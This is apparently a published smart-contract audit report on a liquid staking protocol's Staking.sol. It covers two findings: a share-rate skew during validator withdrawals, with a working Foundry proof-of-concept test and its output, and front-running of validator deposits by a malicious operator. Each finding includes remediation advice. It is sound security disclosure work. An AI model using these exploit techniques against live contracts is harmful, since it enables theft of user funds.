# Stealing user funds due to skewed share rate during withdrawals

## Description

Path: `Staking.sol`

In the event of a full withdrawal of validator(s), the Oracle has a new record where `record.currentTotalValidatorBalanceis` reduced by the amount of `record.windowWithdrawnPrincipalAmount`.

The withdrawn ETH amount of `windowWithdrawnPrincipalAmount` should be transferred from the beacon chain to the `consensusLayerReceiver` (this is the contract `ReturnsReceiver.sol`).

Furthermore, someone should call the `processNextOracleRecords()` function of the `ReturnsAggregator` contract to apply changes from the oracle, where as a result withdrawn ether is added as `unallocatedEth` to the staking contract (L134, L153 of `ReturnsAggregator.sol`).

However, between the oracle record finalisation and the call to `processNextOraclerRecords`, there is a window of opportunity for an attacker to steal a share of the withdrawn funds.

After the record is accepted by the Oracle, the value `record.currentTotalValidatorBalance` inside the `totalControlled()` function is reduced (L527 of `Staking.sol`). Because the `totalControlled()`  doesn’t take into account `windowWithdrawnPrincipalAmount`, it temporarily returns a skewed value. Therefore, before the `processNextOracleRecords()` function is called, the `ethToMntETH()` reports a higher value than it should.

After oracle record finalisation with one or more withdrawn validators, the attacker can immediately deposit ETH into the staking contract at a discounted share rate and subsequently call `processNextOracleRecords`  to restore the share rate, massively increasing the value of the minted share of the attacker.

The share of the stolen funds depends on the deposit of the attacker.

## Code Snippet

```solidity
    function ethToMntETH(uint256 ethAmount) public view returns (uint256) {
        // 1:1 if there is no controlled ETH.
        if (totalControlled() == 0) {
            return ethAmount;
        }

        // deltaMntETH = (1 - exchangeAdjustmentRate) * (mntEthSupply / totalControlled) * ethAmount
        // This rounds down to zero in the case of `(1 - exchangeAdjustmentRate) * ethAmount * mntEthSupply <
        // totalControlled`.
        // While this scenario is theoretically possible, it can only be realised feasibly during the protocol's
        // bootstrap phase and if `totalControlled` and `mntEthSupply` can be changed independently of each other. Since
        // the former is permissioned, and the latter is not permitted by the protocol, this cannot be exploited by an
        // attacker.
        return Math.mulDiv(
            ethAmount,
            mntETH.totalSupply() * uint256(_BASIS_POINTS_DENOMINATOR - exchangeAdjustmentRate),
            totalControlled() * uint256(_BASIS_POINTS_DENOMINATOR)
        );
    }
```

```solidity
    function totalControlled() public view returns (uint256) {
        OracleRecord memory record = oracle.latestRecord();
        uint256 total = 0;
        total += unallocatedETH;
        total += allocatedETHForDeposits;
        /// The total ETH deposited to the beacon chain must be decreased by the deposits processed by the off-chain
        /// oracle since it will be accounted for in the currentTotalValidatorBalance from that point onwards.
        total += totalDepositedInValidators - record.cumulativeProcessedDepositAmount;
        total += record.currentTotalValidatorBalance;
        total += unstakeRequestsManager.balance();
        return total;
    }
```

## Remediation
The value of `totalControlled()` should be properly calculated during full validator withdrawal.
This can be achieved by either having the total controlled ETH be calculated from the last fully processed oracle record only or to have the Oracle also call the ReturnsAggregator record processing function upon any oracle record finalisation.

## PoC
PoC showing that `ethToMntETH` is inflated more than 50% between oracle update and `processNextOracleRecords` call.

```solidity
contract BasicTest is IntegrationTest {
    function testHack() public {
        address alice = makeAddr("alice");

        vm.startPrank(manager);
        ds.staking.grantRole(ds.staking.STAKING_ALLOWLIST_ROLE(), alice);
        vm.stopPrank();

        vm.deal(alice, 400 ether);
        vm.prank(alice);
        ds.staking.stake{value: 400 ether}();

        vm.prank(allocator);
        ds.staking.allocateETH({allocateToUnstakeRequestsManager: 0, allocateToDeposits: 400 ether});

        // create 10 validators
        Staking.ValidatorParams[] memory params = new Staking.ValidatorParams[](
            10
        );
        for (uint256 i = 0; i < 10; i++) {
            params[i] = generateValidatorParams({
                pubkey: abi.encodePacked(uint128(0), i), // 48 bytes
                signature: new bytes(96),
                withdrawalWallet: address(ds.consensusLayerReceiver),
                depositAmount: 32 ether
            });
        }
        vm.prank(initiator);
        ds.staking.initiateValidatorsWithDeposits(params);

        // 5 validators fully withdrawn + reward
        vm.deal(address(ds.consensusLayerReceiver), 160.05 ether);

        console.log("Current ethToMntETH rate is '%s'", ds.staking.ethToMntETH(1 ether));

        vm.roll(block.number + 1000);
        vm.prank(reporter);
        ds.quorumManager.receiveRecord(
            OracleRecord({
                updateStartBlock: DEPLOY_BLOCK_NUMBER + 1,
                updateEndBlock: DEPLOY_BLOCK_NUMBER + 601,
                currentNumValidatorsWithBalance: 5,
                cumulativeNumValidatorsFullyWithdrawn: 5,
                windowWithdrawnPrincipalAmount: 160 ether,
                windowWithdrawnRewardAmount: 0.005 ether,
                currentTotalValidatorBalance: 160 ether,
                cumulativeProcessedDepositAmount: 320 ether
            })
        );
        // Should be >50% higher!
        console.log("Skewed ethToMntETH rate is '%s'", ds.staking.ethToMntETH(1 ether));

        ds.aggregator.processNextOracleRecords(10);

        console.log("Recovered ethToMntETH rate is '%s'", ds.staking.ethToMntETH(1 ether));
    }
}
```

Output:

```
Running 1 test for test/Integration.t.sol:BasicTest
[PASS] testHack() (gas: 1747223)
Logs:
  Current ethToMntETH rate is '1000000000000000000'
  Skewed ethToMntETH rate is '1666666666666666666'
  Recovered ethToMntETH rate is '999988750126561076'

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 13.53ms
```

# Malicious validator can steal user funds by front-running withdrawal credentials

## Description

PATH: `Staking.sol:initiateValidatorsWithDeposits` L396-457

By default in this protocol, the ones who have `INITIATOR_SERVICE_ROLE` and `STAKING_MANAGER_ROLE` manage the beacon chain validator creation process. The validator would sign the deposit data with the withdrawal credentials set to a protocol-controlled contract so that withdrawals would be received by the protocol (`withdrawalWallet_`).

In case the validator is malicious, they can monitor the mempool and front-run the `deposit` transaction of the beacon chain for its pubKey and deposit 1 ether for different withdrawal credentials. Because of the beacon chain implementation and ETH specs ( link ), in `ProcessDeposit`, if the `pubKey` is already registered, it increases its balance, not touching the `withdrawal_credentials`. 

When the deposit reaches the consensus layer, the validator would be granted the 32 ETH of user funds and they can withdraw this to their own address.

This bug was also present in Lido and Frax:

https://research.lido.fi/t/mitigations-for-deposit-front-running-vulnerability/1239

https://github.com/code-423n4/2022-09-frax-findings/issues/81

## Code Snippet

```solidity
function initiateValidatorsWithDeposits(ValidatorParams[] calldata validators)
        external
        onlyRole(INITIATOR_SERVICE_ROLE)
    {
        if (pauser.isInitiateValidatorsPaused()) {
            revert Paused();
        }
        if (validators.length == 0) {
            return;
        }

        // First loop is to check that all validators are valid according to our constraints and we record the
        // validators and how much we have deposited.
        uint256 amountDeposited = 0;
        for (uint256 i = 0; i < validators.length; ++i) {
            ValidatorParams calldata validator = validators[i];

            if (usedValidators[validator.pubkey]) {
                revert PreviouslyUsedValidator();
            }

            if (validator.depositAmount < minimumDepositAmount) {
                revert MinimumValidatorDepositNotSatisfied();
            }

            if (validator.depositAmount > maximumDepositAmount) {
                revert MaximumValidatorDepositExceeded();
            }

            if (validator.depositAmount > allocatedETHForDeposits) {
                revert NotEnoughDepositETH();
            }

            _requireProtocolWithdrawalAccount(validator.withdrawalCredentials);

            usedValidators[validator.pubkey] = true;
            amountDeposited += validator.depositAmount;

            emit ValidatorInitiated({
                id: keccak256(validator.pubkey),
                operatorID: validator.operatorID,
                pubkey: validator.pubkey,
                amountDeposited: validator.depositAmount
            });
        }

        allocatedETHForDeposits -= amountDeposited;
        totalDepositedInValidators += amountDeposited;
        numInitiatedValidators += validators.length;

        // Second loop is to send the deposits to the deposit contract. Keeps external calls to the deposit contract
        // separate from state changes.
        for (uint256 i = 0; i < validators.length; ++i) {
            ValidatorParams calldata validator = validators[i];
            depositContract.deposit{value: validator.depositAmount}({
                pubkey: validator.pubkey,
                withdrawal_credentials: validator.withdrawalCredentials,
                signature: validator.signature,
                deposit_data_root: validator.depositDataRoot
            });
        }
    }
```

## Remediation

This issue can be mitigated by either having validators pre-deposit 1 ETH with the protocol’s withdrawal credentials and check this on-chain before adding it to Operator Registry.

Another mitigation (similar to Lido) is having the caller of deposit also supply the latest deposit state root from the DepositContract. This should then be checked before making the deposit. This ensures that there were no calls to the deposit contract between the signing and the actual depositing.


>Full audit report can be found [here](https://github.com/Hexens/Smart-Contract-Review-Public-Reports/blob/main/Mantle_SCs_Aug23(Public)(Liquid%20Staking%20Protocol).pdf).
